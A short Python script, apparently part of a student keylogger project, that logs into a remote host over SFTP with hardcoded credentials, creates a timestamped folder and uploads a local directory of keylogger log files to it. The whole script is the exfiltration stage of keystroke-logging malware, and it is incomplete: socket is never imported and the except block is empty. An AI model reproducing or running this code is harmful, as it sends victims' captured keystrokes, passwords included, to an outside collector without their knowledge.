import pysftp
import time

myHostname = "192.168.1.6"  # change this
myUsername = "pi"  # change this
myPassword = "kali123"  # change this #should be 8 characters or more including special characters
remote_file = '/home/pi/transfer/'
file_path = "D:\\Stuff\\D studies\\Adv dip of it\\Semester 5\\Applied projects\\Keylogger\\Project\\log_files"

with pysftp.Connection(host=myHostname, username=myUsername, password=myPassword) as sftp:
    try:
        print("Connection Successfully Established")
        sftp.chdir(remote_file)
        time_str = time.strftime("log_%Y%m%d_%H%M")
        sftp.mkdir(time_str)
        print("Directory created")
        sftp.chdir(time_str)
        slash = "/"
        new_path = sftp.pwd
        sftp.put_d(file_path, new_path + slash, preserve_mtime=False)
        sftp.close()

    except socket.error as e:


